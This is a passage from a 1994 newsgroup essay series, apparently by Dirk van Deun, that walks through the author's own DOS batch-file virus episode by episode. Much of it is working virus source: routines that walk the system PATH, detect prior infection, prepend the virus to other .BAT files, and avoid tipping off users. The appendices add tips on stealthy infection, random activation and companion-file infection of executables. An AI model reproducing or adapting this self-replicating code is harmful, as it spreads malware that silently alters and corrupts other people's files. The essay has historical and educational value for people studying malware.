PATH. VPATH had to be the piece of PATH that had still to be
processed by the virus. If the whole path had been processed,
the value of VPATH would be '.'; if there was no VPATH, the
virus had to assume that the computer had just been turned on
and set VPATH to the value of PATH.

Programming a procedure that set VPATH to all directories of
the old VPATH minus one, which got infected, proved to be easy
after the experience with the procedure findself (see Part IV): 
I passed %VPATH% as parameter from the main program and it was 
cut in easy to handle little pieces (%2,%3,%4,...) by DOS; at 
the end a simple loop pasted all pieces, except the first, back
together into one variable: the new VPATH.

(changes to the procedure dispatcher block:)
if "%1=="/ViRuS_PARSEPATH goto ViRuS_parsepath

(changes to the main program:)
if "VPATH%==" set VPATH=%PATH%>nul.ViRuS
call %0 /ViRuS_PARSEPATH %VPATH%
if "%VPATH%==" set VPATH=.>nul.ViRuS

(new procedure parsepath, taking the place of ViRuS_outer_loop:)
:ViRuS_parsepath
for %%a in (%2\*.bat;%2*.bat) do call %0 /ViRuS_MULTIPLY %%a
set VPATH=%3>nul.ViRuS
:ViRuS_loop
shift>nul.ViRuS
if "%3==" goto XXX_END>nul.ViRuS
set VPATH=%VPATH%;%3>nul.ViRuS
goto ViRuS_loop

---------------------------

VPATH, implemented this way, has some advantages over other
possible systems. Most important of all, if it gets corrupted
or reset by the user, the virus will not go bezerk or
anything: if VPATH is gone, it will create a new copy, else it
will try to work with the new VPATH without complaining. Also,
if the theoretical user that is ignorant of the virus will 
look at his environment variables, he will be puzzled where 
the new variable comes from, but there is no reason for him to 
suspect that it has anything to do with a virus (except the V 
in VPATH maybe).

---------------------------

As I was testing the new version, I found it took too long to
work its way through the whole path. I have a long system
path, as I think I already mentioned, in which are many
directories which don't contain any batch files. When such a
directory was next in VPATH, the virus was ready in a flash,
because all it had to do was cut a piece from the variable 
VPATH. It would be better if the virus recognized empty 
directories and passed them by.

If the virus processed a directory that contained no batch
files, the multiply procedure didn't get called. So if I added
a line 'set hit=T' to that procedure, there was a simple way
for the parsepath procedure to know when to go on to process
another directory, and when to stop. It would stop processing
directories when it had at least infected one file (%hit%=T),
or when VPATH was exhausted (in which case, it would still try
to infect the current directory). The new version of parsepath
should speak for itself -- or at least it should whisper:

:ViRuS_parsepath
for %%a in (%2\*.bat;%2*.bat) do call %ViRuSname% /ViRuS_MULTIPLY %%a
if "%hit%=="T goto ViRuS_new_vpath
shift>nul.ViRuS
if not "%2==" goto ViRuS_parsepath
if not "%1==". for %%a in (.\*.bat) do call %ViRuSname% /ViRuS_MULTIPLY %%a
:ViRuS_new_vpath
set hit=>nul.ViRuS
set VPATH=%3>nul.ViRuS
:ViRuS_loop
shift>nul.ViRuS
if "%3==" goto XXX_END>nul.ViRuS
set VPATH=%VPATH%;%3>nul.ViRuS
goto ViRuS_loop

Maybe one small comment: it is no longer %0 that is CALLed,
but %ViRuSname%. The reason for that is the new SHIFT command,
which affects %0 too. This caused a nasty bug for a while.

---------------------------

Exceptions and special cases always have a potential for
trouble. For the BatchViRuS, autoexec.bat was the culprit. I
just said that the first copy of the virus that was run after
booting should set VPATH to PATH. The trouble now was that if
the autoexec was infected, the copy of the virus attached to
autoexec.bat would set VPATH to PATH before the real autoexec
had had the chance to set the system path, a job usually done 
by autoexec.bat. So the copy of the virus attached to autoexec
was quite useless for infecting others, and special measures
would have to be taken not to let the virus in autoexec.bat
set VPATH to an incorrect initial value. I decided to add some
'if %0==autoexec...' lines.

Now I wondered of course, how to spell these lines. In other
words, what was the %0 of autoexec.bat, as run by command.com
at boot time ? Was it 'autoexec' ? 'AUTOEXEC' ?
'autoexec.bat' ? 'AUTOEXEC.BAT' ? I found out by putting a
simple 'echo %0' in my regular autoexec.bat and rebooting. The
displayed line was: 'echo is on'. It took me a while (stupid,
no ?) to realize that this meant that %0 was void.

As autoexec was such a pain in the neck, I decided that a copy
of the virus that discovered that "%0==" should just let the
old autoexec execute and print a message indicating that the
virus was present. The actual code is not particularly
interesting: you can look at it in the complete listing.

To be continued... 

Old episodes can now be downloaded by ftp: emoryi.jpl.nasa.gov:
/utils/batch/batvirus.zip. I thank Kevin Quitt for drawing my
attention to a flaw in my university's server's handling of
'finger' requests, and for uploading the files regularly. 


PART 6
(9 Nov. 1994)

Writing a computer virus is a bit like planning the perfect
murder. Some very amiable and peaceful people like to plan the
ultimate crime just for the intellectual pleasure: afterwards
they don't execute their plan, but write a story or a novel
about it. Likewise, I believe, there are many nice and decent
hackers in the world that spend their evenings programming the
perfect virus, only to prove to themselves and to a few
friends that they can do it. I did it: now I am writing the
story. It will appear in eight to ten weekly episodes on this
newsgroup. Comments are much appreciated.


	The Hidden Strengths of the Dos Batch Language

			   Part VI:
		 On How to Recognize Yourself


Since the first four-line program I had often wished I could
find a way to let a batch file find out something about the
contents of another batch, specifically whether or not the
other batch was already infected with the virus. I wanted
some command, or combination of commands, to provide
information that an IF construction could test. First I
thought of a combination of 'find "ViRuS" <file1 >f1',
'find "ViRuS" <file2 >f2', 'comp f1 f2', and 'if errorlevel',
but I quickly found out that COMP doesn't set the errorlevel.
As a matter of fact, among the few DOS utilities that set an
errorlevel, none was relevant to the problem.

That excluded the 'if errorlevel' approach. Now what about the
'if exist' construction ? In that case, ATTRIB would have to
be used. I first considered to just mark batches as hidden
files when the virus infected them, but this would attract the
attention of even the most stupid user, so it couldn't exactly
be called an elegant solution. And on the other hand, too much
could go wrong if the user used the ATTRIB utility himself
regularly. So the hidden attribute would have to be set
temporarily each time a file was handed to the multiply
procedure. But then I was back where I had started.

Or was I ? I remembered now how a resident program tests
whether or not another copy of itself exists in memory: it
puts some test values in the registers, issues one of the
interrupts that it hooks when it is resident, and then tests
whether in the registers are values that only itself, or a
copy of itself, could have put there. In fact, it checked if
it was resident, by attempting to let the other copy of itself
run, and then look what happened.

Could I do something similar ? Could I let another batch hide
itself with ATTRIB if it had already been infected ? I most
surely could. I could CALL the other batch with a parameter
like /ViRuS_CHECK_YOURSELF, to which corresponded a procedure
in the virus code that set the hidden bit of its own carrier.
That was no problem; but the problem was that if an uninfected
batch got CALLed that way, it would not recognize the
/ViRuS_CHECK_YOURSELF parameter, probably ignore it, or else
misinterpret it, and the uninfected batch would run and
generally do all kinds of things. That was unwanted.

But this still was a step towards the solution. I gave up the
plan of CALLing the other batch in its entirety: I would use
the old technique of 'find "ViRuS"'. I could let FIND split
off the virus from the carrier in the other file, if the other
file was infected; if it would not be infected, an empty file
would be created. In both cases, I could safely CALL the new
batch file that FIND created, with for parameters
/ViRuS_CHECK and the name of the complete batch file, of which
the CALLed file had been part.

As a matter of fact, I could even go further. I could let
FIND seek only the line I wanted: 'attrib +h %1', and CALL
the file that FIND had created, with as only parameter the
name of the complete batch being processed. As 'attrib +h %1'
is not a specifically unusual command, I made it 'aTTriB +h
%1', to be sure that FIND found only the right line.

So, after the 'goto XXX_END' of the multiply procedure, and
before the :ViRuS_OLDBAT label, I added the line:
     aTTriB +h %1>nul.ViRuS
At this place in the code, it would never get executed during
normal execution of the virus, due to the GOTO command right
above it. 
Then, at the beginning of the multiply procedure, I added:
     find "aTTriB +h %%1" <%2>xViRuSx.bat
     call xViRuSx %2
     del xViRuSx.bat
and, to check if the hidden-bit had been set:
     if not exist %2 goto ViRuS_ready
and, of course, at the end of the multiply procedure:
     :ViRuS_ready
     attrib -h %2>nul.ViRuS

With the FIND command, I had been lucky. I had to type two
percent signs in the search string instead of one, because 
of the preprocessing phase for percent signs (see Part III),
and this proved to be my luck: if this hadn't been necessary,
the FIND command would find two lines in an infected file: not
only 'aTTriB +h %1>nul.ViRuS', but also 'find "aTTriB +h %1"
<%2>xViRuSx.bat' itself !

But alas, the line 'if not exist %2...' didn't work. It turned
out that IF EXIST ignored the hidden bit, and found all files.
Had all been for nothing ?

No. I knew that the FOR command did not find hidden files.
'for %a in (*.*) do...' finds only normal files. So, after
testing whether a GOTO in a FOR command would be executed
correctly (it will) I changed the line to:
     for %%a in (%2) goto ViRuS_ready

But this also found the hidden files ! Then I realized that %2
would always be expanded to an exact file name, without wild
cards. In that case, FOR doesn't assume that the string is a
file name, and it just feeds it into %a. So I changed the line
to
     for %%a in (%2*) goto ViRuS_ready
and, more or less to my surprise, it worked. The GOTO command
was not executed if %2 didn't exist. The '*' did not have any
side-effects, because all files processed by this line have an
extension of .BAT, which is a maximum-length extension.

Oops ! The GOTO should be executed if %2 did exist, not if it
didn't exist. I had forgotten about the 'not'. Of course, I
couldn't put 'not' in a FOR command, so I reprogrammed:
     for %%a in (%2*) goto ViRuS_not_ready
     goto ViRuS_ready
     :ViRuS_not_ready

Now that a virus could recognize itself, the multiply
procedure proper could be simplified, as it needed less FIND
commands, and so also real infections got faster:

:ViRuS_multiply
echo Checking: %2>con.ViRuS
find "aTTriB +h %%1" <%2>xViRuSx.bat
call xViRuSx %2
del xViRuSx.bat
for %%a in (%2*) do goto ViRuS_not_ready
goto ViRuS_ready
:ViRuS_not_ready
find "ViRuS" <%ViRuSname%.bat>xViRuSx.bat         (!)
type %2>>xViRuSx.bat                              (!)
echo :XXX_END>>xViRuSx.bat                        (!)
copy xViRuSx.bat %2>nul
del xViRuSx.bat
echo Infecting: %2>con.ViRuS
:ViRuS_ready
attrib -h %2>nul.ViRuS
goto XXX_END>nul.ViRuS

rem data for the first find in ViRuS_multiply
aTTriB +h %1>nul.ViRuS

---------------------------

Checking the contents of the processed file also made obsolete, 
in the main program, the lines:

attrib +h %ViRuSname%.bat
attrib -h %ViRuSname%.bat

---------------------------

But there is something left to tell about the multiply
procedure. I cannot believe it took me so long to realize
that using ATTRIB and IF EXIST was a terrible waste of
time and disk activity (ATTRIB is an external command): 'set'
and 'if ==' would do as well. I had been so preoccupied with
'hiding' the file that I didn't see that anything an IF
could test would do. I had reasoned:

0. I must know when to infect and when not to
-->  1. I must be able find out something about a file
     -->  2. I can find something out about file attributes
	  -->  3. I must use ATTRIB and test the hidden-bit

and I had wandered on levels 2 and 3 ever after. After I had
discovered the FIND/CALL trick, I hadn't taken a step back to
see that on level 0, the original requirement was 'I (or
better: the virus) must know when to infect and when not to'.
And for that purpose, 'SeT IchBin=%0' and 'find "Set
IchBin=%%0" <%2>xViRuSx.bat' + 'call...' + 'if %IchBin%==...'
could be used.

The experiment with ATTRIB had at least learned me how not to
let the 'find' line be found by itself: use a command with
percent signs in it. So I used %0 as value for IchBin, which
would be 'xViRuSx' during execution of the CALLed xViRuSx.bat,
and would be represented as '%%0' in the 'find' line. Here is
the new, simplified and optimized version:

:ViRuS_multiply
echo Checking: %2>con.ViRuS
find "SeT IchBin=%%0" <%2>xViRuSx.bat
call xViRuSx
del xViRuSx.bat
if "%IchBin%=="xViRuSx goto ViRuS_ready
find "ViRuS" <%ViRuSname%.bat>xViRuSx.bat
type %2>>xViRuSx.bat
echo :XXX_END>>xViRuSx.bat
copy xViRuSx.bat %2>nul
del xViRuSx.bat
echo Infecting: %2>con.ViRuS
:ViRuS_ready
set IchBin=
goto XXX_END>nul.ViRuS

rem data for the first find in ViRuS_multiply
SeT IchBin=%0>nul.ViRuS

---------------------------

Note: many episodes of this essay had already been written when
I learned that COPY refuses to copy empty files. This quirk of
my favourite operating system permits a test whether a file is
empty (copy+if exist), and this again permits a test whether a
file contains lines that have the word "ViRuS" in them. (find
>file+copy+if exist), which makes possible a completely
different approach to target file checking in the procedure
ViRuS_multiply. If I had known this before I wrote and published
episode one, with the complete program in it, I would probably
have changed my virus and used this slightly simpler, slightly
shorter, but functionnally equivalent method. Now, for the sake 
of consistency, I will stick to the original version, as given 
in Part I, throughout all remaining episodes.

To be continued...   Old episodes can be downloaded by ftp from
		     emoryi.jpl.nasa.gov:/utils/batch/batvirus.zip

PART 7
(16 Nov. 1994)

Writing a computer virus is a bit like planning the perfect
murder. Some very amiable and peaceful people like to plan the
ultimate crime just for the intellectual pleasure: afterwards
they don't execute their plan, but write a story or a novel
about it. Likewise, I believe, there are many nice and decent
hackers in the world that spend their evenings programming the
perfect virus, only to prove to themselves and to a few
friends that they can do it. I did it: now I am writing the
story. It will appear in eight to ten weekly episodes on this
newsgroup. Comments are much appreciated.


	The Hidden Strengths of the Dos Batch Language

			   Part VII:
		   About Call and Command /c


Last week I told you about the new methods for infecting files,
and how I was able to speed up the infection process by letting 
the virus check first whether the target file had already been 
infected before. As could reasonably be expected, this created 
a new bug (for both methods: it is not the checking, but the
new way of infecting that is buggy). Sometimes I create batch 
programs with 'copy con'; often one-liners, for instance:

C:\BATCH>copy con tetris.bat
@c:\windows\win c:\windows\games\tetris^Z

I don't begin these batches with '@echo off'; I just put @
before the line. In that case, it is important to type the ^Z
directly after the line, not on the next, if you do not want
to get an extra prompt on your screen after execution of the
batch file, which is ugly. I just hate it when a batch
terminates and DOS displays two prompts instead of only one.

Now if such a one-line batch got infected in the new way,
':XXX_END' got pasted to the end of the one line of the
original batch, not put on a line of its own. This hadn't
happened before because the 'find /v "ViRuS" <%2 |find /v
":XXX_END" >>xViRuSx.bat' had always reformatted the file a
bit, putting the ^Z on a line of its own. The new TYPE
command did not do that. The problem was easily fixed: I
inserted a line 'echo.>>xViRuSx.bat', which inserts a 
carriage return and a line feed, before 'echo :XXX_END
>>xViRuSx.bat'. 'Echo.' by the way, with a point typed
directly at the 'echo', is the way to echo empty lines, as
'echo' alone asks for the status of echo: on or off.

The problem had been solved, but not in an elegant way. Normal
batch files now got an extra empty line, and if 'echo' was
off, this made DOS display an extra prompt; and there were
already extra prompts, because infected files didn't end on
:XXX_END^Z (which was impossible to accomplish with ECHO)
but on :XXX_END{cr/lf}^Z. Three prompts where there was only
one before would alert even an inattentive user that something
had happened, and although I didn't want to really use the
virus on innocent victims, I did want the virus to behave as
realistically as possible. The solution to this petty problem
proved to require a total reorganisation of the code.

---------------------------

As you can see, all the trouble concentrated around that last
line, the :XXX_END that got added to each file. Indeed, if I
could do without that line, I could just paste the original
batch to the end of the virus, and the original ^Z would stay
where it was, so the amount of prompts (normally one) would
not change. Now could I do without ?

I wondered if I could replace 'goto XXX_END' with EXIT
commands. It didn't work. Then I tried the pre-3.3 way to
'call' in batch files: 'command /c'. If I used an extra shell,
the EXIT would surely work. It worked. I didn't need the
:XXX_END any more. Then real trouble started.

---------------------------

The first problem was the sudden strange behaviour of
environment variables. The inevitable flash of insight brought
the answer: environment variables are passed only from parent
program to child, and not the other way. As soon as the extra
shell, created with 'command /c ...' was done, the variables
were done for. So what did I do now ? Work around it, of
course; as always ! 

Let's take a look at all procedures individually. The first
procedure involved is ViRuS_findself. It was now called as
follows:

if not exist %0.bat command /c %0 /ViRuS_FINDSELF %path%

and the procedure was (notice the 'exit'):

:ViRuS_findself
if "%2==" exit>nul.ViRuS
if exist %2\%ViRuSname%.bat set ViRuSname=%2\%ViRuSname%
if exist %ViRuSname%.bat exit
if exist %2%ViRuSname%.bat set ViRuSname=%2%ViRuSname%
if exist %ViRuSname%.bat exit
shift>nul.ViRuS
goto ViRuS_findself

The procedure sets ViRuSname in vain: when 'exit' aborts the
current shell, the variable disappears. I changed the
procedure to:

:ViRuS_findself
if "%2==" echo.>xViRuSx.bat
if "%2==" exit>nul.ViRuS
if exist %2\%ViRuSname%.bat echo set ViRuSname=%2\%ViRuSname%>xViRuSx.bat
if exist %2\%ViRuSname%.bat exit
if exist %2%ViRuSname%.bat echo set ViRuSname=%2%ViRuSname%>xViRuSx.bat
if exist %2%ViRuSname%.bat exit
shift>nul.ViRuS
goto ViRuS_findself

and I let the main program call the new xViRuSx.bat
(using CALL, as was possible in this case; not COMMAND/c)
immediately after calling the procedure ViRuS_findself:

if not exist %0.bat command /c %0 /ViRuS_FINDSELF %path%
if not exist %0.bat call xViRuSx
if not exist %0.bat del xViRuSx.bat

This way, the variable is set in the 'outer shell'

---------------------------

In the ViRuS_parsepath procedure, the %hit% variable was
abolished, and the line
     if "%hit%=="T goto ViRuS_new_vpath
was replaced by
     for %%a in (%2\*.bat;%2*.bat) do goto ViRuS_new_vpath
which will make more sense to you if you compare it with the
line above it:
     for %%a in (%2\*.bat;%2*.bat) do command /c %ViRuSname% 
					 /ViRuS_MULTIPLY %%a
'goto ViRuS_new_vpath' will only be executed if (and as many
times as) files exist that fit the specification.

And the GOTO command really works, however strange it may
seem. As a matter of fact, if you set echo off, you will see
that 'goto ViRuS_new_vpath' is echoed as many times as there
are files that fit the description; then the last GOTO is
really executed. Thus the FOR command is used as an extended
IF EXIST, an 'if at-least-one-such-file-exist' (but only for
non-hidden files, as we saw earlier).

Further, following the same principle as for ViRuS_findself, 

:ViRuS_loop
shift>nul.ViRuS
if "%3==" goto XXX_END>nul.ViRuS
set VPATH=%VPATH%;%3>nul.ViRuS
goto ViRuS_loop

is changed to

:ViRuS_loop
shift>nul.ViRuS
if "%3==" echo set VPATH=%VPATH%>xViRuSx.bat
if "%3==" exit>nul.ViRuS
set VPATH=%VPATH%;%3>nul.ViRuS
goto ViRuS_loop

and

call %0 /ViRuS_PARSEPATH %VPATH%

becomes:

command /c %0 /ViRuS_PARSEPATH %VPATH%
call xViRuSx
del xViRuSx.bat

---------------------------

Only the multiply procedure is simplified instead of made more
complicated by this change: I already mentioned that 'set
hit=T' might go, but also 'set IchBin=' at the end is
superfluous now, because the 'exit' kills IchBin. This makes
the procedure:

:ViRuS_multiply
echo Checking: %2>con.ViRuS
find "SeT IchBin=%%0" <%2>xViRuSx.bat
call xViRuSx
del xViRuSx.bat
if "%IchBin%=="xViRuSx exit
find "ViRuS" <%ViRuSname%.bat>xViRuSx.bat
type %2>>xViRuSx.bat
copy xViRuSx.bat %2>nul
del xViRuSx.bat
echo Infecting: %2>con.ViRuS
exit>nul.ViRuS

By the way, if you have been wondering what IchBin stands for:
'Ich bin' is German for 'I am'. I don't know why exactly I gave
this variable a German name instead of a Dutch or English one.
Maybe I had been watching too much German TV ? Or was there a
German song on the radio when I needed a name for the variable ?
Maybe something else still influenced me on an unconcious 
level. There are things in life we will never fully comprehend...

---------------------------

That was one problem taken care of. There was another:
suddenly, I got many errors saying that the environment was
full. The secondary copies of command.com seemed to have an
environment that was just large enough for the variables they
initially got from their parent shell, and that for some
reason couldn't 'grow', what I understand is normally possible
for command.com's environment (I am a bit in the dark about
this subject). Anyway, setting an initial size by changing
'command /c' to 'command /e:10000 /c' made these error
messages disappear.

Just as a curiosity, I will mention a last difference I
discovered between CALL and COMMAND/c: unlike COMMAND/c, 
CALL accepts input from a pipe. However, it executes only 
the first non-empty line:
     echo Hello World | call
will work fine, but
     type autoexec.bat | call
will execute only the first non-empty line of autoexec.bat.

    [Correction June 1995: It seems that this method only works  ]
    [correctly if it is used in the last line of the batch file !]

'type con | call' also works. Strangely, 'call <file' works,
while 'call <CON' doesn't (as maybe could be expected, because
to DOS, 'call<con' is equivalent to 'call' without redirection).
Maybe someone someday somewhere will find a use for all this.
And maybe, just maybe, someone may find out why it was
programmed like that.

---------------------------

This was an episode with a lot of (dull?) code in it, but the
virus, as given in its entirety in Part I of this essay, is
finished now. Next week, there will be a last episode about
the limits of MS-DOS, and the limits of the virus, and about
some possible changes I could have made to the viruscode (but
I didn't).

To be continued...   Old episodes can be downloaded by ftp from
		     emoryi.jpl.nasa.gov:/utils/batch/batvirus.zip

PART 8
(23 Nov. 1994)

Writing a computer virus is a bit like planning the perfect
murder. Some very amiable and peaceful people like to plan the
ultimate crime just for the intellectual pleasure: afterwards
they don't execute their plan, but write a story or a novel
about it. Likewise, I believe, there are many nice and decent
hackers in the world that spend their evenings programming the
perfect virus, only to prove to themselves and to a few
friends that they can do it. I did it: now I am writing the
story. This is the last episode: if you missed some episodes, 
the full story can be downloaded by ftp: emoryi.jpl.nasa.gov:
/utils/batch/batvirus.zip


	The Hidden Strengths of the Dos Batch Language

			  Part VIII:
		  Optimizing and Improving


In writing the virus, a few times I had ran into a very
annoying limitation of MS-DOS: the maximum line length of 127
characters. Command.com will not process longer lines. The
first time I encountered the problem was when a line that had
%path% in it was expanded during execution beyond the 127
character limit, and letters fell off at the end of the line,
creating a nasty bug. I had not been able to solve the problem,
I had only reformulated the command, so that %path% was at the
end of the line, and if letters fell off, no damage was done,
only functionality was reduced.

The same limitation is giving trouble still. Commands like
     for %%a in (%2\*.bat;%2*.bat) do command /e:10000 /c
     %ViRuSname% /ViRuS_MULTIPLY %%a
can expand to very long lines, not when the system path is too
long, but when seperate elements of the system path are too
long. This line just could expand to:
     for %a in (C:\JOHN\TOOLS\NORTON\*.bat;C:\JOHN\TOOLS\
     NORTON*.bat) do command /e:10000 /c C:\FRED\BATCHES\
     TETRIS.BAT /ViRuS_MULTIPLY %a
or even to something longer. It is possible to minimize this
danger, often by splitting long lines in two smaller lines with
the same functionality. E.g. the line in the above example
could be splitted into:
     for %%a in (%2\*.bat) do ...
     for %%a in (%2*.bat) do...

Another method to minimize the danger is shortening the
parameter strings /ViRuS_MULTIPLY, /ViRuS_PARSEPATH and
/ViRuS_FINDSELF to /ViRuSM, /ViRuSP and /ViRuSF; also, 'command
/e:9999' is almost as good as 'command /e:10000', so that's
another byte won. You could even let the virus make a copy of
command.com by the name of c.com, and use 'c /c' in the longer
commands. But I stopped here.

Indeed, it was time to stop. The code as it was now, was
elegant and simple, and I did not want to obfuscate it. It
worked, as it was, on my own computer, of which the system path
contained no excessively long elements. It had been enough.

---------------------------

But I feel I should mention a few changes I still could have
made, to make the picture complete.

When a batch file starts another batch without using CALL 
or COMMAND/c, execution of the first batch is not
suspended but halted completely. It is as if the first batch
fades into the other: the second, 'chained' batch is not on
another level, like a 'called' batch. This way, and this is
important, if a batch that is itself 'called' by another one,
'chains' to a third one, then after execution of the third
one, control is given back to the first. 

Quite a while after I had implemented the changes described
in Part VII, I realised that it had not been necessary to use
COMMAND/c in combination with EXIT, that I could also
have kept the CALL commands, and emulated the EXIT's by
chaining to an empty batch file. As an example, I will give
the three versions of the procedure findself and the
accompaning procedure call for comparison:

1. The standard version:

if not exist %0.bat call %0 /ViRuS_FINDSELF %path%

:ViRuS_findself
if "%2==" goto XXX_END>nul.ViRuS
if exist %2\%ViRuSname%.bat set ViRuSname=%2\%ViRuSname%
if exist %ViRuSname%.bat goto XXX_END
if exist %2%ViRuSname%.bat set ViRuSname=%2%ViRuSname%
if exist %ViRuSname%.bat goto XXX_END
shift>nul.ViRuS
goto ViRuS_findself

2. The command/c version:

if not exist %0.bat command /e:10000 /c %0 /ViRuS_FINDSELF %path%
if not exist %0.bat call xViRuSx
if not exist %0.bat del xViRuSx.bat

:ViRuS_findself
if "%2==" echo.>xViRuSx.bat
if "%2==" exit>nul.ViRuS
if exist %2\%ViRuSname%.bat echo set ViRuSname=%2\%ViRuSname%>xViRuSx.bat
if exist %2\%ViRuSname%.bat exit
if exist %2%ViRuSname%.bat echo set ViRuSname=%2%ViRuSname%>xViRuSx.bat
if exist %2%ViRuSname%.bat exit
shift>nul.ViRuS
goto ViRuS_findself

3. The call/chain version:

if not exist %0.bat echo.>yViRuSy.bat
if not exist %0.bat call %0 /ViRuS_FINDSELF %path%
if not exist %0.bat del yViRuSy.bat

:ViRuS_findself
if "%2==" yViRuSy
if exist %2\%ViRuSname%.bat set ViRuSname=%2\%ViRuSname%
if exist %2\%ViRuSname%.bat yViRuSy
if exist %2%ViRuSname%.bat set ViRuSname=%2%ViRuSname%
if exist %2%ViRuSname%.bat yViRuSy
shift>nul.ViRuS
goto ViRuS_findself

---------------------------

But tests indicated that there was absolutely no reason to
switch to this technique: if I used it for all procedure calls,
only one second was won in infecting the 53 files of my \batch
directory; and on the other hand, when there was no extra
shell (created with command /e:10000), there would be danger
that the IchBin variable could not be created, the only
variable in the program that was essential and might not be
corrupted. For safety's sake, I would have to use a method of
checking files that did not need a variable (see Part VI).

There might be some places where the new technique could be
advantageous: it could be used to shorten the two very long
lines in the procedure parsepath. If it was only used inside
the parsepath procedure, and not for calling the parsepath
procedure itself, the multiply procedure would 'inherit' a
large environment from parsepath, so IchBin would be safe, and
the two lines would be in less danger of being too long. But as
I said before: I won't optimize for line length, as I prefer
clear and elegant code. 

---------------------------

Another change that would be good for a real-world virus, would
be a test if command.com and find.exe are really to be found in
the system path; if not, the virus should abort immediately.

---------------------------

And now: the last bug. Because of course there is one left,
although we prefer to call it a feature. It is this: when a
batch is infected, in which the writer used the same technique
to make procedure calls as I did in my virus, the virus will
become active every time a procedure is called. This may
become very annoying. This bug hadn't been solved yet when I
started to write this essay, in fact it had not even been
detected. I can suggest a fix, but I didn't myself bother to
put it in the version that is now eating my hard disk space. 

The principle is simple: before execution of the original
batch, an environment variable savevoff would be set to
%voff%, and voff to T. (Remember that voff was a variable
designed to make it possible to disable the virus) After 
execution voff should be set back to %savevoff%. But then 
there is this problem: how can the virus regain control 
after execution of the original batch, to do this ? That
can be solved by, instead of jumping to ViRuS_OLDBAT with
GOTO, CALLing %0 /ViRuS_OLDBAT %0 %1 %2 %3 %4 %5 %6 %7 %8 %9
(with in the procedure dispather:
    if not "%1=="/ViRuS_OLDBAT goto NOT_ViRuS_OLDBAT
    shift>nul.ViRuS
    shift>nul.ViRuS
    goto ViRuS_OLDBAT
    :NOT_ViRuS_OLDBAT
where the repetition of %0 in the CALL command makes it
possible to 'shift out' /ViRuS_OLDBAT without loosing the
correct %0 value, for use by the original batch).

If you fear that the original batch might accept more than
nine parameters, (you are a careful programmer and) you can 
paste them together (same method as used for VPATH in the
parsepath procedure) and call %0 /ViRuS_OLDBAT %0 %ALLPARMS%.

---------------------------

This again leaves the problem, however, of how the virus, that
has regained control, and reset voff, should end execution of
the batch. It cannot jump to XXX_END, because there is no more
XXX_END; it cannot use EXIT, because it is executed in the
outer shell; so the 'chaining' method has to be used. The
virus will have to create an empty file and chain to it, but
it will have no more chance to delete it, of course. 

I tested whether a batch file can delete itself, but this was
only possible if the DEL command was on the last line of
the file, and if this line was immediately terminated by ^Z;
and such a file cannot be made using only ECHO commands.

(Using debug with an input script feels like cheating; if I 
wrote this virus to use it, instead of for the sport, I would 
be practical and use debug, as follows:

echo e100 "@del %%0.bat" 1A >zViRuSz.scr
echo rcx                   >>zViRuSz.scr
echo C                     >>zViRuSz.scr
echo nzViRuSz.bat          >>zViRuSz.scr
echo w                     >>zViRuSz.scr
echo q                     >>zViRuSz.scr
debug <zViRuSz.scr>nul
del zViRuSz.scr
zViRuSz

With debug, of course, everything is possible: e.g. the virus
could use debug to test if there is enough disk space left for
infections: let debug assemble a little program on the fly, that
sets ERRORLEVEL if there isn't enough space left. More and more
functions could be handled more efficiently by debug scripts,
and the batchvirus would become a kind of hybrid batch/debugvirus.
That is the reason why using debug is against the philosophy of
the project, although debug is a standard DOS tool. By the way,
a rough test of disk space can also be done by XCOPYing %0 and
the file that is going to be infected, and checking errorlevel
before deleting the copies again: that would be more in the 
spirit of the BatchViRuS, and another possible improvement.)

(Let's open those parentheses again and warn you to be careful
with XCOPY. XCOPY wants input from the user, which of course you
can supply with '<readymadefile', but this input differs between
different language versions of DOS.)

If you don't use debug, the chained-to file should be left 
empty, and the filename should be something like \TEMP0001.BAT,
and/or a hidden file, or something equally deceptive. There
seems to be no more elegant solution. It is maybe the 'ugliness'
of the solution, more than the improbability of occurence of 
the problem and its relative harmlesness, that made me leave 
this last bug fix out of the final code.

---------------------------

Still imperfect my virus might be, but I had proven my point.
The code as it was now was not totally optimized for real use,
but it was a perfect demonstration of the principles behind
it. It had taken me weeks to get the program right: weeks for
only some seventy lines of code, but I am as proud of them, as
the scientists who proved that you can make a silk purse out
of a sow's ear must have been of their artifact. Writing a
virus in DOS batch language: it sounded impossible once, but
in fact it has been possible since MS-DOS 3.3. In all those
years, nobody seems to have tried, or succeeded; at least I
never heard about a virus for batches.

In the Dutch monthly PC Magazine, there is always a section
about weird WordPerfect macros, in which the macro language is
used for things it was clearly not designed for. I always read
that section, although I only use the simplest functions of
WP, if I use WP at all. It is the artistry of some programmers
that makes this section worth reading, their imaginativeness
with limited means. Also, a while ago, there was an article in
my newspaper, about an exhibition of African toys, toys made
by children who cannot afford to buy the ready-made stuff. One
photograph showed a surprisingly realistic replica of a plane,
made mainly out of a few empty packets of cigarettes and many
hours of tinkering. These are two examples of real art. 

Given the right circumstances, the appropriate limitedness of
means, everybody will become an artist. On the other hand, if
means are abundant, there is little incentive to become one.
Primitive programming environments must be cherished as a
source of creative programming ("Down with the Mac!"). I think
I did my share with the BatchViRuS, but many primitive
programming languages remain to be explored: who now will
write the virus for WordPerfect macros ?

Happy hacking, 

Dirk van Deun, Brussels, November 1994.


------------------
APPENDICES/ADDENDA
------------------

1. First of all, there seem to be more batch viruses in the world than mine
alone. However, only I and Terry Newton seem to write 'true' batch viruses:
most other batch viruses use debug scripts or embedded machine code. (It is
possible to write printable .COM programs; you just need a lot of patience
and a liking for puzzles. I also have seen a printable hex2bin program, so
it isn't even necessary to make printable programs any more: you can include
the printable hex2bin.com, plus your own program in hexadecimal notation in
a batch, and ECHO them both into files; then run hex2bin on the other file.)
Some of these not-really-batch viruses are malicious.

2. I incorporated the signature string ViRuS in all lines of my virus in quite
ingenious ways, but Terry Newton showed me the one simple way: just put %ViRuS%
or any other non-existant environment variable with the signature in it
anywhere on a line: DOS will replace it by an empty string at run time.

3. There is a reasonably effective and quick infection method that is worth
mentioning: infect the 'last' batch file of directories.
	for %a in (%directory%\*.bat) do set file=%a
        --> infect %file%
This infects slowly, but can go almost unnoticed, because of its simplicity,
and because only one batch at a time is infected.

4. In DOS 6 it is easy to activate the virus on pseudo-random moments:
	echo. | time | find "00" > nul
	--> if errorlevel
In older DOS versions, FIND doesn't affect ERRORLEVEL. You will have to work
around this by redirecting the output of FIND to a file and checking whether
or not this file is empty (remember that COPY does not work on empty files,
so that you can use COPY FILE FILE2 plus IF EXIST FILE2...). 

5. One virus I have seen 'infects' .com and .exe files by making a batch file
with the name of the executable, and renaming the executable. The batch then
calls the original program.

6. My remark about macro viruses (in the conclusion) isn't very up to date any 
